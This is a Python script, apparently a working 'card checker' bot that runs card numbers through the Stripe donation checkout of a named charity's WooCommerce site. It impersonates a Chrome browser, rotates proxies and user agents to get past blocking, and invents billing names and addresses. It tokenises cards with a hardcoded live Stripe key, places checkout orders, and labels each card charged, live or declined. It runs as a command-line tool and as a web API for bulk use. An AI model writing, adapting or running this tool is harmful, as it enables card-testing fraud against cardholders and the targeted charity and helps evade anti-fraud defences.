#!/usr/bin/env python3
"""
Stripe + WooCommerce (forcesforchange.org) card checker.
- CLI:  python3 bot.py '4111111111111111|12|29|123' [--debug] [--proxy URL]
- API:  gunicorn bot:app --bind 0.0.0.0:$PORT --workers 4 --timeout 60
Production features: proxy rotation, connection reuse, fast timeouts, retries.
"""
import json
import os
import random
import re
import string
import sys
import time
from urllib.parse import quote_plus

# ── HTTP client: prefer curl_cffi ─────────────────────────────────────────
try:
    from curl_cffi import requests as curl_requests
    _IMPERSONATE = "chrome120"
    _HTTP_BACKEND = "curl_cffi"
except ImportError:
    curl_requests = None
    _IMPERSONATE = None
    _HTTP_BACKEND = "requests"

if curl_requests is None:
    import requests as _requests_mod
    class _SessionFactory:
        @staticmethod
        def create(proxy_url=None):
            s = _requests_mod.Session()
            s.trust_env = False
            if proxy_url:
                s.proxies = {"http": proxy_url, "https": proxy_url}
            return s
else:
    class _SessionFactory:
        @staticmethod
        def create(proxy_url=None):
            try:
                s = curl_requests.Session(impersonate=_IMPERSONATE)
            except Exception:
                s = curl_requests.Session()
            s.trust_env = False
            if proxy_url:
                s.proxies = {"http": proxy_url, "https": proxy_url}
            return s


# ═══════════════════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════════════════
HTTP_TIMEOUT = (6, 15)          # faster: 6s connect, 15s read
FAST_TIMEOUT = (4, 10)          # used on retry attempts 2+
SITE = "https://forcesforchange.org"
DONATE_URL = f"{SITE}/donate/"
CHECKOUT_URL = f"{SITE}/checkout/"

STRIPE_PK = os.getenv("FCC_PK", (
    "pk_live_51RJd5fGlfOdBh4Nl2YUzFnY6zYb5IEAkHYSatP353K0wRioIydSEkrK"
    "fWMrApQmyNrPafBOqLy4KQ4a5O3aVODi500IGgjyNG6"
))
STRIPE_VERSION = "2024-06-20"
CHARGED_RESPONSE = "Payment Success"

MAX_RETRIES = int(os.getenv("FCC_RETRIES", "3"))
RETRY_BACKOFF = float(os.getenv("FCC_BACKOFF", "1.5"))
PROXY_FILE = os.getenv("FCC_PROXY_FILE", "proxies.txt")
PROXY_DEFAULT = os.getenv("FCC_PROXY", "").strip() or None

# Proxy pool — loaded from file at startup
PROXY_POOL = []
_proxy_last_used = {}


def load_proxy_pool():
    """Load proxies from FCC_PROXY_FILE (one per line)."""
    global PROXY_POOL
    PROXY_POOL = []
    if os.path.exists(PROXY_FILE):
        try:
            with open(PROXY_FILE, "r", encoding="utf-8") as f:
                for line in f:
                    p = line.strip()
                    if p and not p.startswith("#"):
                        # normalize to http:// prefix
                        if not p.startswith(("http://", "https://", "socks")):
                            p = f"http://{p}"
                        PROXY_POOL.append(p)
        except Exception as e:
            print(f"[proxy] load error: {e}", file=sys.stderr)
    if PROXY_DEFAULT:
        PROXY_POOL.append(PROXY_DEFAULT)
    print(f"[proxy] loaded {len(PROXY_POOL)} proxies", file=sys.stderr)


def pick_proxy():
    """Round-robin proxy rotation with cooldown to avoid hammering one."""
    if not PROXY_POOL:
        return None
    now = time.time()
    # Filter proxies used in the last 3 seconds
    available = [p for p in PROXY_POOL if now - _proxy_last_used.get(p, 0) > 3]
    if not available:
        available = PROXY_POOL  # fallback: use any
    p = random.choice(available)
    _proxy_last_used[p] = now
    return p


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
]

FIRST_NAMES = ['James','John','Robert','Michael','William','David','Richard',
    'Joseph','Thomas','Charles','Emily','Emma','Olivia','Ava','Isabella',
    'Sophia','Mia','Charlotte','Amelia','Harper']
LAST_NAMES = ['Smith','Johnson','Williams','Brown','Jones','Garcia','Miller',
    'Davis','Wilson','Taylor','Anderson','Thomas','Jackson','White','Harris',
    'Martin','Thompson','Moore','Young','Allen']
STREETS = ['Main St','Oak Ave','Maple Dr','Cedar Ln','Pine Rd','Elm St',
    'Washington Blvd','Park Ave','Lake Dr','Hill Rd']
CITIES_STATES = [
    ('Phoenix','AZ','850'),('Los Angeles','CA','900'),('Houston','TX','770'),
    ('Chicago','IL','606'),('Dallas','TX','752'),('San Antonio','TX','782'),
    ('San Diego','CA','921'),('Jacksonville','FL','322'),('Austin','TX','787'),
    ('Columbus','OH','432'),
]


# ═══════════════════════════════════════════════════════════════════════════
# RESPONSE CLASSIFIER
# ═══════════════════════════════════════════════════════════════════════════
CHARGE_PATTERNS = [
    r"payment success", r"payment successful", r"order success",
    r"successfully charged", r"order placed",
    r"thank you for your (?:purchase|order|donation)",
]
APPROVE_PATTERNS = [
    r"insufficient[_\s]?funds", r"do not honor", r"do_not_honor",
    r"incorrect cvc", r"cvc[_\s]?check", r"incorrect_number",
    r"pickup card", r"restricted card", r"generic_decline",
]
DECLINE_PATTERNS = [
    r"\bdeclined\b", r"card was declined", r"\bexpired\b",
    r"stolen", r"lost card", r"\bfraud\b", r"known test card",
]
ERROR_PATTERNS = [
    r"timed out", r"timeout", r"proxy", r"tunnel",
    r"connection refused", r"connection reset", r"connection error",
    r"\bdns\b", r"\bssl\b", r"network error", r"http 5\d\d",
]


def _matches(patterns, text):
    for p in patterns:
        if re.search(p, text, re.IGNORECASE):
            return True
    return False


def classify_text(text, status_hint="", code_hint=""):
    text = (text or "").lower()
    hint = (status_hint or "").lower()
    if hint == "charged" or _matches(CHARGE_PATTERNS, text):
        return "charged", CHARGED_RESPONSE, code_hint or "charged"
    if _matches(ERROR_PATTERNS, text):
        return "error", (text or "")[:150], code_hint or "connection_error"
    if _matches(APPROVE_PATTERNS, text):
        return "approved", (text or "")[:150], code_hint or "approved"
    if _matches(DECLINE_PATTERNS, text):
        return "declined", (text or "")[:150], code_hint or "declined"
    if hint in ("declined", "error", "approved", "charged"):
        return hint, (text or "")[:150], code_hint or hint
    return "declined", (text or "")[:150], code_hint or "declined"


# ═══════════════════════════════════════════════════════════════════════════
# HTTP HELPERS
# ═══════════════════════════════════════════════════════════════════════════
def _browser_headers(ua, extra=None):
    h = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "user-agent": ua,
        "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
    }
    if extra:
        h.update(extra)
    return h


def _request_with_retry(session, method, url, *, headers=None, data=None,
                        params=None, debug=False, retries=MAX_RETRIES,
                        retry_on_403=True):
    """Retry on 403/5xx/timeout with backoff. Faster timeout on retries."""
    attempt = 0
    last_status = None
    last_err = None
    while attempt < retries:
        attempt += 1
        try:
            h = dict(headers or {})
            if "user-agent" in h:
                h["user-agent"] = random.choice(USER_AGENTS)

            # Tighter timeout on retries
            tmo = HTTP_TIMEOUT if attempt == 1 else FAST_TIMEOUT

            r = session.request(method, url, headers=h, data=data,
                                params=params, timeout=tmo)
            last_status = r.status_code

            if (retry_on_403 and r.status_code == 403) or \
               r.status_code in (408, 425, 429, 500, 502, 503, 504, 520, 521, 522, 523, 524):
                if attempt < retries:
                    wait = RETRY_BACKOFF ** attempt + random.uniform(0, 0.3)
                    if debug:
                        print(f"[retry] HTTP {r.status_code} on {url} — sleeping {wait:.1f}s")
                    time.sleep(wait)
                    continue
                return r, r.status_code, None

            return r, r.status_code, None

        except Exception as e:
            last_err = f"{type(e).__name__}: {str(e)[:100]}"
            if debug:
                print(f"[retry] {last_err} (attempt {attempt}/{retries})")
            if attempt < retries:
                time.sleep(RETRY_BACKOFF ** attempt + random.uniform(0, 0.3))
                continue
            return None, last_status, last_err

    return None, last_status, last_err or "max retries exceeded"


# ═══════════════════════════════════════════════════════════════════════════
# STRICT CHARGE INTERPRETATION
# ═══════════════════════════════════════════════════════════════════════════
def interpret_checkout(cj, raw_text, debug=False):
    if not isinstance(cj, dict):
        return "ERROR", "non-dict response", "bad_response"

    result = cj.get("result")
    redirect = str(cj.get("redirect") or "").lower()
    status = str(cj.get("status") or cj.get("order_status") or "").lower()
    payment_result = cj.get("payment_result") or {}
    pr_status = str(payment_result.get("status") or "").lower()
    messages = cj.get("messages")

    if debug:
        print(f"[debug] result={result!r} redirect={redirect!r} status={status!r} pr_status={pr_status!r}")

    # 3DS
    if any(k in redirect for k in ("pay", "authenticate", "3ds")):
        return "DECLINED", "3DS required", "3ds"

    # Strong charge signals
    charge_reasons = []
    if pr_status == "success":
        charge_reasons.append("payment_result.status=success")
    if "order-received" in redirect:
        charge_reasons.append("order-received redirect")
    if status in ("processing", "completed"):
        charge_reasons.append(f"order_status={status}")

    msg_text = ""
    if isinstance(messages, str):
        msg_text = re.sub(r"<[^>]+>", "", messages).strip()
    elif isinstance(messages, list):
        msg_text = " | ".join(re.sub(r"<[^>]+>", "", str(m)) for m in messages[:3])

    st, clean_msg, code = classify_text(f"{msg_text} {json.dumps(cj, default=str)[:400]}")

    if charge_reasons:
        return "APPROVED", CHARGED_RESPONSE, "charged"

    if result == "success" and not charge_reasons:
        if st == "approved":
            return "APPROVED", clean_msg or "Insufficient funds", "approved"
        if st == "declined":
            return "DECLINED", clean_msg or "Declined", "declined"
        if st == "error":
            return "ERROR", clean_msg or "Error", "connection_error"
        return "ERROR", clean_msg or "No charge confirmation", "unconfirmed"

    if st == "charged":
        return "APPROVED", CHARGED_RESPONSE, "charged"
    if st == "approved":
        return "APPROVED", clean_msg or "Live card", "approved"
    if st == "error":
        return "ERROR", clean_msg or "Error", "connection_error"

    return "DECLINED", clean_msg or "Declined", "declined"


# ═══════════════════════════════════════════════════════════════════════════
# CORE CHECKER
# ═══════════════════════════════════════════════════════════════════════════
def check_card(cc, mm, yy, cvc, proxy_url=None, debug=False):
    started = time.perf_counter()
    yy = yy.strip()
    yy_full = "20" + yy if len(yy) == 2 else yy
    mm = mm.strip().zfill(2)
    cc = cc.strip()
    cvc = cvc.strip()

    def _done(status, response, code=None):
        out = {
            "status": status.upper(),
            "response": response,
            "time": f"{time.perf_counter() - started:.2f}s",
            "backend": _HTTP_BACKEND,
        }
        if code:
            out["code"] = code
        return out

    try:
        ua = random.choice(USER_AGENTS)
        first_name = random.choice(FIRST_NAMES)
        last_name = random.choice(LAST_NAMES)
        full_name = f"{first_name} {last_name}"
        email_user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        email = f"{email_user}@gmail.com"
        address = f"{random.randint(100, 99999)} {random.choice(STREETS)}"
        city, state, zip_prefix = random.choice(CITIES_STATES)
        zip_code = zip_prefix + str(random.randint(10, 99))

        proxy = proxy_url or pick_proxy()
        session = _SessionFactory.create(proxy_url=proxy)

        if debug:
            print(f"[debug] backend={_HTTP_BACKEND} proxy={proxy or 'none'}")

        # ── Step 1: donate page ────────────────────────────────────────
        r1, _, err1 = _request_with_retry(
            session, "GET", DONATE_URL, headers=_browser_headers(ua), debug=debug
        )
        if r1 is None:
            return _done("ERROR", f"Donate failed: {err1}", "connection_error")
        if r1.status_code == 403:
            return _done("ERROR", "Donate HTTP 403 — IP blocked", "proxy_error")
        if r1.status_code >= 400:
            return _done("ERROR", f"Donate HTTP {r1.status_code}", "http_error")
        html = r1.text

        # ── Step 2: add to cart ────────────────────────────────────────
        pid_match = (
            re.search(r'["\']add-to-cart["\']\s*value=["\'](\d+)["\']', html)
            or re.search(r'\?add-to-cart=(\d+)', html)
            or re.search(r'"product_id"\s*:\s*(\d+)', html)
        )
        product_id = pid_match.group(1) if pid_match else None
        if product_id:
            _request_with_retry(
                session, "POST", f"{SITE}/",
                headers=_browser_headers(ua, {
                    "accept": "application/json, text/javascript, */*; q=0.01",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "origin": SITE,
                    "referer": DONATE_URL,
                    "x-requested-with": "XMLHttpRequest",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                }),
                params={"wc-ajax": "add_to_cart"},
                data={"product_id": product_id, "quantity": "1"},
                debug=debug,
            )

        # ── Step 3: nonce ──────────────────────────────────────────────
        r3, _, _ = _request_with_retry(
            session, "GET", CHECKOUT_URL, headers=_browser_headers(ua), debug=debug
        )
        if r3 is None:
            return _done("ERROR", "Checkout page failed", "connection_error")
        nonce_match = (
            re.search(r'"woocommerce-process-checkout-nonce"\s*value="([^"]+)"', r3.text)
            or re.search(r'"checkout_nonce"\s*:\s*"([^"]+)"', r3.text)
            or re.search(r'"woocommerce-process-checkout-nonce"\s*value="([^"]+)"', html)
        )
        nonce = nonce_match.group(1) if nonce_match else "716ee815cf"

        # ── Step 4: Stripe tokenization ────────────────────────────────
        try:
            stripe_mid = session.cookies.get("__stripe_mid") or "c1ccf2d6-5b18-4fdc-a355-a6238ee7137bfb20e4"
            stripe_sid = session.cookies.get("__stripe_sid") or "d75866ab-c96e-4246-a6f5-7ff152f406ebcef345"
        except Exception:
            stripe_mid = "c1ccf2d6-5b18-4fdc-a355-a6238ee7137bfb20e4"
            stripe_sid = "d75866ab-c96e-4246-a6f5-7ff152f406ebcef345"

        stripe_data = (
            f"billing_details[name]={quote_plus(full_name)}"
            f"&billing_details[email]={quote_plus(email)}"
            f"&billing_details[address][city]={quote_plus(city)}"
            "&billing_details[address][country]=US"
            f"&billing_details[address][line1]={quote_plus(address)}"
            "&billing_details[address][line2]="
            f"&billing_details[address][postal_code]={zip_code}"
            f"&billing_details[address][state]={state}"
            "&type=card"
            f"&card[number]={cc}"
            f"&card[cvc]={cvc}"
            f"&card[exp_year]={yy_full}"
            f"&card[exp_month]={mm}"
            "&allow_redisplay=unspecified"
            "&pasted_fields=number"
            "&payment_user_agent=stripe.js%2Fc891fde8fc%3B+stripe-js-v3%2Fc891fde8fc"
            "%3B+payment-element%3B+deferred-intent"
            f"&referrer={quote_plus(SITE)}"
            "&time_on_page=114823"
            f"&guid={stripe_mid}"
            f"&muid={stripe_mid}"
            f"&sid={stripe_sid}"
            f"&key={STRIPE_PK}"
            f"&_stripe_version={STRIPE_VERSION}"
        )

        r4, _, err4 = _request_with_retry(
            session, "POST", "https://api.stripe.com/v1/payment_methods",
            headers={
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/",
                "user-agent": ua,
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
            },
            data=stripe_data, debug=debug,
        )
        if r4 is None:
            return _done("ERROR", f"Stripe failed: {err4}", "connection_error")

        try:
            stripe_json = r4.json()
        except Exception as e:
            return _done("ERROR", f"Stripe JSON: {e}", "bad_json")

        pm_id = stripe_json.get("id", "")
        if not pm_id or not pm_id.startswith("pm_"):
            err = stripe_json.get("error", {}) or {}
            msg = err.get("message") or err.get("code") or "Stripe tokenization failed"
            st, clean_msg, _ = classify_text(msg)
            if st == "approved":
                return _done("APPROVED", clean_msg, "approved")
            if st == "error":
                return _done("ERROR", clean_msg, "connection_error")
            return _done("DECLINED", clean_msg, "declined")

        # ── Step 5: checkout ───────────────────────────────────────────
        checkout_data = (
            "wc_order_attribution_source_type=typein"
            "&wc_order_attribution_referrer=(none)"
            "&wc_order_attribution_utm_campaign=(none)"
            "&wc_order_attribution_utm_source=(direct)"
            "&wc_order_attribution_utm_medium=(none)"
            "&wc_order_attribution_utm_content=(none)"
            "&wc_order_attribution_utm_id=(none)"
            "&wc_order_attribution_utm_term=(none)"
            "&wc_order_attribution_utm_source_platform=(none)"
            "&wc_order_attribution_utm_creative_format=(none)"
            "&wc_order_attribution_utm_marketing_tactic=(none)"
            f"&wc_order_attribution_session_entry={quote_plus(DONATE_URL)}"
            "&wc_order_attribution_session_pages=1"
            "&wc_order_attribution_session_count=1"
            f"&billing_email={quote_plus(email)}"
            f"&billing_first_name={quote_plus(first_name)}"
            f"&billing_last_name={quote_plus(last_name)}"
            "&billing_country=US"
            f"&billing_address_1={quote_plus(address)}"
            "&billing_address_2="
            f"&billing_city={quote_plus(city)}"
            f"&billing_state={state}"
            f"&billing_postcode={zip_code}"
            "&billing_phone="
            "&lang=en"
            "&payment_method=stripe"
            "&wc-stripe-payment-method-upe="
            "&wc_stripe_selected_upe_payment_type="
            "&wc-stripe-is-deferred-intent=1"
            f"&woocommerce-process-checkout-nonce={nonce}"
            "&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review"
            f"&wc-stripe-payment-method={pm_id}"
        )

        r5, _, err5 = _request_with_retry(
            session, "POST", f"{SITE}/",
            headers=_browser_headers(ua, {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": SITE,
                "referer": DONATE_URL,
                "x-requested-with": "XMLHttpRequest",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            }),
            params={"wc-ajax": "checkout"},
            data=checkout_data, debug=debug,
        )
        if r5 is None:
            return _done("ERROR", f"Checkout failed: {err5}", "connection_error")

        try:
            cj = r5.json()
        except Exception:
            return _done("ERROR", f"Checkout non-JSON: {r5.text[:100]}", "bad_json")

        status, message, code = interpret_checkout(cj, r5.text, debug=debug)
        return _done(status, message, code)

    except Exception as exc:
        return _done("ERROR", f"{type(exc).__name__}: {str(exc)[:150]}", "exception")


def check_card_str(cc_str, proxy_url=None, debug=False):
    parts = cc_str.replace("/", "|").replace(":", "|").split("|")
    if len(parts) < 4:
        return "error", "invalid_cc_format", "bad_format"
    cc, mm, yy, cvc = [p.strip() for p in parts[:4]]
    result = check_card(cc, mm, yy, cvc, proxy_url=proxy_url, debug=debug)
    return result["status"].lower(), result["response"], result.get("code", "")


# ═══════════════════════════════════════════════════════════════════════════
# FLASK API
# ═══════════════════════════════════════════════════════════════════════════
try:
    from flask import Flask, request, jsonify

    app = Flask(__name__)

    # Load proxies at import time (runs once when gunicorn loads the app)
    load_proxy_pool()

    @app.route("/", methods=["GET"])
    def root():
        return jsonify({
            "service": "fcc-checker",
            "backend": _HTTP_BACKEND,
            "status": "online",
            "proxies": len(PROXY_POOL),
            "usage": "GET /check?card=4111111111111111|12|29|123",
        })

    @app.route("/health", methods=["GET"])
    def health():
        return jsonify({
            "ok": True,
            "http_backend": _HTTP_BACKEND,
            "proxies_loaded": len(PROXY_POOL),
        })

    @app.route("/check", methods=["GET", "POST"])
    def check():
        if request.method == "POST":
            payload = request.get_json(silent=True) or {}
            card = (payload.get("card") or "").strip()
            proxy = payload.get("proxy")
        else:
            card = (request.args.get("card") or "").strip()
            proxy = request.args.get("proxy")
        if not card:
            return jsonify({"error": "missing card parameter"}), 400
        status, message, code = check_card_str(card, proxy_url=proxy or None)
        return jsonify({
            "status": status.upper(),
            "response": message,
            "code": code,
            "proxy_used": proxy or "auto",
            "backend": _HTTP_BACKEND,
        })

except ImportError:
    app = None


# ═══════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    load_proxy_pool()

    args = sys.argv[1:]
    debug = "--debug" in args
    args = [a for a in args if a != "--debug"]

    proxy = None
    if "--proxy" in args:
        i = args.index("--proxy")
        if i + 1 < len(args):
            proxy = args[i + 1]
            args = args[:i] + args[i + 2:]
    args = [a for a in args if not a.startswith("--")]

    if args:
        card_str = args[0]
        result = check_card_str(card_str, proxy_url=proxy, debug=debug)
        status, message, code = result
        print(json.dumps({
            "card": card_str,
            "status": status.upper(),
            "response": message,
            "code": code,
            "backend": _HTTP_BACKEND,
            "proxy": proxy or "auto",
        }, indent=2))
    else:
        if app is None:
            print("Usage: python3 bot.py 'cc|mm|yy|cvv' [--debug] [--proxy URL]")
            sys.exit(1)
        port = int(os.getenv("PORT", "8080"))
        print(f"Starting on 0.0.0.0:{port}  (backend: {_HTTP_BACKEND}, {len(PROXY_POOL)} proxies)")
        app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
